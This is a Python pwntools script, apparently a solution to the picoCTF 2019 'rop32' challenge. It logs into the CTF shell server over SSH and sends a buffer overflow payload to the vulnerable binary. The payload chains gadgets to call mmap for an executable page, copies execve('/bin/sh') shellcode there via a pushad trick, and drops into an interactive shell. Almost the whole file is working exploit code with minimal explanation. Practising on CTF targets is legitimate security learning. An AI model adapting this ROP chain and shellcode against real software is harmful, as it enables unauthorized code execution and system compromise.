from pwn import *

USERNAME = 'yourname'
PASSWORD = 'password'

s = ssh(user=USERNAME, host='2019shell1.picoctf.com', password=PASSWORD)
sh = s.run('sh')
sh.sendline('cd /problems/rop32_0_b4142d4df31cb73e170c77dac234a79a')
sh.sendline('./vuln')

SWITCH_WAY = 1

addr_memcpy = 0x0806b170
addr_mmap = 0x0806db30
addr_mprotect = 0x0806dc50

addr_stage = 0x20000000
stage_length = 0x1000

addr_pushad_ret = 0x080c917b  # pushad  ; ret  ;  (2 found) ... edi->esi->ebp->ebx->edx->ecx->eax
addr_popad_ret = 0x0804893e # popad  ; cld  ; ret  ;  (1 found) ... 
addr_pop_edi_ret = 0x08049adb  # pop edi ; ret  ;  (344 found)
addr_pop_esi_ret = 0x08049708  # pop esi ; ret  ;  (105 found)
addr_pop_ebp_ret = 0x0804834c  # pop ebp ; ret  ;  (466 found)
addr_pop_ebx_ret = 0x080481c9  # pop ebx ; ret  ;  (230 found)

dummy = 0x41414141

### shellcode
# http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

### make payload
payload = b'A' * 28

### mmap(addr_mmap, len, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
# mmap new page with rwx permissions to put shellcode
payload += p32(addr_mmap)
payload += p32(addr_popad_ret)  # 8-pops to continue rop chain
payload += p32(addr_stage)      # mmap new page from 0x20000000
payload += p32(stage_length)    # to 0x20001000
payload += p32(0x7)             # PROT_READ|PROT_WRITE|PROT_EXEC permissions
payload += p32(0x22)            # MAP_PRIVATE|MAP_ANONYMOUS
payload += p32(0xffffffff)      # -1
payload += p32(0x0)
payload += (p32(dummy) * 2)

### memcpy(addr_stage, shellcode, len(shellcode))
# pushad = push EAX,ECX,EDX,EBX,ESP,EBP,ESI,EDI
#
# EDI = addr_memcpy
# ESI = addr_stage(mmapped address)
# EBP = addr_stage(1st-arg, mmapped_address)
# ESP = stack address of shellcode (2nd_arg : we don't need to modify its value)
# EBX = length of shellcode (3rd-arg)
# we don't need to set values of EDX,ECX,EAX,ESP
payload += p32(addr_pop_edi_ret)
payload += p32(addr_memcpy)
payload += p32(addr_pop_esi_ret)
payload += p32(addr_stage)
payload += p32(addr_pop_ebp_ret)
payload += p32(addr_stage)
payload += p32(addr_pop_ebx_ret)
payload += p32(len(shellcode))
payload += p32(addr_pushad_ret)
payload += shellcode

sh.recvuntil('?\n')
print('[*] send payload :')
print(payload)
sh.send(payload)
sh.interactive()



### mprotect(0x080dc000, 0x080ff000-0x080dc000, 7)